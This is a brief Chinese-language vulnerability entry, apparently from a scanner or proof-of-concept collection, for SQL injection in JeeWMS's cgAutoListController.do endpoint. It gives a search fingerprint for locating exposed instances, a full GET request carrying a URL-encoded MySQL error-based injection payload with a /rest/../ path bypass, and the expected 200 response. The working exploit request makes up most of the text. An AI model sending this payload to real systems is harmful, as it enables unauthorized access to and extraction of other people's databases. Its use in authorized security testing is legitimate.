# JeeWMScgAutoListController.doSQL注入漏洞

JeeWMScgAutoListController ｜ SQL注入 ｜ —
- **指纹**：`body="url:userController.do?userOrgSelect&userId="`
- **请求**：`GET /rest/../cgAutoListController.do?datagrid&configId=1%27+AND+GTID_SUBSET%28CONCAT%280x7178627a71%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x717a6a6b71%29%2C4503%29--+wnMN  HTTP/1.1`
- **响应特征**：200